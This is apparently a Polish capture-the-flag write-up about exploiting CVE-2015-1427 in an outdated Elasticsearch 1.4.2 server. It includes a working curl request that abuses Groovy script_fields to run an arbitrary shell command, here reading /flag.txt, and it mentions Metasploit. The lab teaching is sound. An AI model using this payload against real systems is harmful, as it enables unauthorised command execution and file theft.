## Opis

Aktualizowanie oprogramowania to bardzo ważna sprawa.
Używamy wersji Elasticsearch `1.4.2`, która została wydana w **2014 roku**! Obecna wersja to już `9.0.1`.

Stare wersje oprogramowania często zawierają luki bezpieczeństwa — tak jest również w tym przypadku.

## Rozwiązanie

Na początku warto sprawdzić, jakie są znane podatności dla tej wersji.

Po chwili szukania można trafić na `CVE-2015-1427`. CVE (Common Vulnerabilities and Exposures) to unikalny identyfikator nadawany znanym lukom w oprogramowaniu.

W tym przypadku ta luka umożliwia wykonanie dowolnego kodu na serwerze, np. odczyt plików. W Internecie jest dużo opisów i przykładów jak go wykonać - np. [tutaj](https://github.com/vulhub/vulhub/blob/master/elasticsearch/CVE-2015-1427/README.md).

W uproszeniu wystarczy wysłać takie zapytanie:
```shell
curl -XPOST 'http://localhost:9200/_search?pretty' -H 'Content-Type: application/json' -d '
{
  "size": 1,
  "query": {
    "match_all": {}
  },
  "script_fields": {
    "test": {
      "lang": "groovy",
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /flag.txt\").getText()"
    }
  }
}
'
```

Pole `script` nie powinno być wykonywane, a jest i dzięki temu możemy wykonać dowolną komendę. 
W naszym przypadku jest to `cat /flag.txt` - czyli wyświetlenie zawartości tego pliku.

### Podsumowanie

W cyberbezpieczeństwie nie zawsze trzeba samemu odkrywać podatności.
Istnieją bazy takie jak CVE, które dokumentują znane luki.

Aby zautomatyzować ich wyszukiwanie i wykorzystanie, można korzystać z narzędzi takich jak [Metasploit](https://www.metasploit.com/), które umożliwiają testowanie wielu podatności.